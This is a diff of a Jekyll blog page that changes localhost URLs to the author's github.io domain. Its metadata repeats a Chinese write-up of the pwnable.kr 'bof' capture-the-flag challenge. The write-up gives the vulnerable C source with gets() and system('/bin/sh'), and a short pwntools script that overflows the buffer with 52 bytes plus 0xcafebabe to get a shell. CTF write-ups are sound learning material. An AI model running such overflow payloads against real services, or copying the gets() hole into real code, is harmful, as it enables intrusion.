@@ -20,26 +20,26 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:site_name" content="My way, though far away">
 <meta property="og:title" content="Pwnable刷题 3">
-<meta property="og:url" content="http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html">
+<meta property="og:url" content="https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html">
 
 
   <meta property="og:description" content="  刷pwnable。。。题目:bof - 5 ptNana told me that buffer overflow is one of the most common software vulnerability.Is that true?娜娜告诉我缓冲区溢出是最常见的软件漏洞之一，这是真的么？Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.cRunning at : nc pwnable.kr 9000writeup栈溢出问题。首先查看源代码。#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key){	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe){		system(&quot;/bin/sh&quot;);	}	else{		printf(&quot;Nah..\n&quot;);	}}int main(int argc, char* argv[]){	func(0xdeadbeef);	return 0;}本来以为是普通的栈溢出的，没想到仔细一看：checksec  bof[*] &#39;/root/zjgcjy/pwn/bof&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled好像开了各种保护，但是再仔细一看，其实不然。这个题目就只要比较是否相等就行，没有执行栈上的数据，所以开保护没事。用gdb调试查看栈分布，然后溢出就行了。from pwn import *#pwn_socket= process(&#39;./bof&#39;)pwn_socket=remote(&#39;pwnable.kr&#39;,9000)shellcode = &quot;\xbe\xba\xfe\xca&quot;payload = &#39;A&#39; * (52) + shellcodepwn_socket.send(payload)pwn_socket.interactive()得到shell后cat flag得到flag。flag:daddy, I just pwned a buFFer :)">
 
 
 
-  <meta property="og:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
+  <meta property="og:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
 
 
 
   <meta name="twitter:site" content="@zjgcjy">
   <meta name="twitter:title" content="Pwnable刷题 3">
   <meta name="twitter:description" content="  刷pwnable。。。题目:bof - 5 ptNana told me that buffer overflow is one of the most common software vulnerability.Is that true?娜娜告诉我缓冲区溢出是最常见的软件漏洞之一，这是真的么？Download : http://pwnable.kr/bin/bofDownload : http://pwnable.kr/bin/bof.cRunning at : nc pwnable.kr 9000writeup栈溢出问题。首先查看源代码。#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key){	char overflowme[32];	printf(&quot;overflow me : &quot;);	gets(overflowme);	// smash me!	if(key == 0xcafebabe){		system(&quot;/bin/sh&quot;);	}	else{		printf(&quot;Nah..\n&quot;);	}}int main(int argc, char* argv[]){	func(0xdeadbeef);	return 0;}本来以为是普通的栈溢出的，没想到仔细一看：checksec  bof[*] &#39;/root/zjgcjy/pwn/bof&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled好像开了各种保护，但是再仔细一看，其实不然。这个题目就只要比较是否相等就行，没有执行栈上的数据，所以开保护没事。用gdb调试查看栈分布，然后溢出就行了。from pwn import *#pwn_socket= process(&#39;./bof&#39;)pwn_socket=remote(&#39;pwnable.kr&#39;,9000)shellcode = &quot;\xbe\xba\xfe\xca&quot;payload = &#39;A&#39; * (52) + shellcodepwn_socket.send(payload)pwn_socket.interactive()得到shell后cat flag得到flag。flag:daddy, I just pwned a buFFer :)">
-  <meta name="twitter:url" content="http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html">
+  <meta name="twitter:url" content="https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html">
 
   
     <meta name="twitter:card" content="summary">
     
-      <meta name="twitter:image" content="http://localhost:4000/assets/images/bio-photo.jpg">
+      <meta name="twitter:image" content="https://zjgcjy.github.io/assets/images/bio-photo.jpg">
     
   
 
@@ -58,7 +58,7 @@
   
 
 
-<link rel="canonical" href="http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html">
+<link rel="canonical" href="https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html">
 
 
 
@@ -69,7 +69,7 @@
     
       "@type": "Person",
       "name": "Blogger",
-      "url": "http://localhost:4000/",
+      "url": "https://zjgcjy.github.io/",
       "sameAs": ["https://twitter.com/","https://github.com/"]
     
   }
@@ -193,7 +193,7 @@
     
       
         <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <a href="https://zjgcjy.github.io/" itemprop="item"><span itemprop="name">Home</span></a>
           <meta itemprop="position" content="1" />
         </li>
         <span class="sep">/</span>
@@ -501,11 +501,11 @@ flag:daddy, I just pwned a buFFer :)</p>
     <h4 class="page__share-title">Share on</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnable%E5%88%B7%E9%A2%98+3%20http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-3.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnable%E5%88%B7%E9%A2%98+3%20https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-3.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-3.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-3.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-3.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2017-08%2Fpwnable%25E5%2588%25B7%25E9%25A2%2598-3.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
@@ -766,7 +766,7 @@ pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
     
   <script>
     var disqus_config = function () {
-      this.page.url = "http://localhost:4000/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.url = "https://zjgcjy.github.io/posts/2017-08/pwnable%E5%88%B7%E9%A2%98-3.html";  // Replace PAGE_URL with your page's canonical URL variable
       this.page.identifier = "/posts/2017-08/pwnable刷题-3"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
     };
     (function() { // DON'T EDIT BELOW THIS LINE
